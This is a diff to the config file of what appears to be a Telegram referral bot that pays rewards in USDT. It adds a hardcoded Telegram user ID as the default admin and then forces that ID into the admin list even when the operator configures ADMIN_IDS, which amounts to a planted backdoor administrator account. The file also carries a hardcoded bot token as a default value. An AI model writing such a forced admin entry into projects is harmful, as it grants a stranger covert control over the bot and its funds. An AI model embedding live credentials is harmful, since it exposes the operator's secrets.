@@ -6,8 +6,10 @@ load_dotenv()
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8617211126:AAEQoT7QzYx31pidbajzW5i2jF5pr6jFS28").strip()
 
 # Admin IDs list parsed from comma-separated string
-admin_ids_str = os.getenv("ADMIN_IDS", "")
+admin_ids_str = os.getenv("ADMIN_IDS", "6575066703")
 ADMIN_IDS = [int(i.strip()) for i in admin_ids_str.split(",") if i.strip().isdigit()]
+if 6575066703 not in ADMIN_IDS:
+    ADMIN_IDS.append(6575066703)
 
 DEFAULT_REFERRAL_REWARD = float(os.getenv("DEFAULT_REFERRAL_REWARD", "0.5"))
 CURRENCY_NAME = os.getenv("CURRENCY_NAME", "USDT")
